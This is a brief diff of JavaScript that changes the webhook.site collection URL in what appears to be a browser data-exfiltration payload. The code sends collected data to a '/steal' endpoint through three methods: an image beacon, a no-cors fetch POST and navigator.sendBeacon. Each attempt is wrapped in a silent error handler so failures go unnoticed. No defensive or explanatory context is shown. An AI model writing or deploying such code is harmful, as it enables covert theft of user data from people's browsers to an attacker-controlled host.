@@ -54,12 +54,12 @@
             // Try image beacon
             try {
                 const img = new Image();
-                img.src = 'https://webhook.site/626a78c0-8e50-4f9c-93da-e6c9af1e1899/steal?data=' + encoded;
+                img.src = 'https://webhook.site/cf1f2dfe-253c-4682-9476-51752a41e89f/steal?data=' + encoded;
             } catch(e) {}
             
             // Try fetch
             try {
-                fetch('https://webhook.site/626a78c0-8e50-4f9c-93da-e6c9af1e1899/steal', {
+                fetch('https://webhook.site/cf1f2dfe-253c-4682-9476-51752a41e89f/steal', {
                     method: 'POST',
                     body: JSON.stringify(exfilData),
                     mode: 'no-cors'
@@ -68,7 +68,7 @@
             
             // Try sendBeacon
             try {
-                navigator.sendBeacon('https://webhook.site/626a78c0-8e50-4f9c-93da-e6c9af1e1899/steal', JSON.stringify(exfilData));
+                navigator.sendBeacon('https://webhook.site/cf1f2dfe-253c-4682-9476-51752a41e89f/steal', JSON.stringify(exfilData));
             } catch(e) {}
         }
         
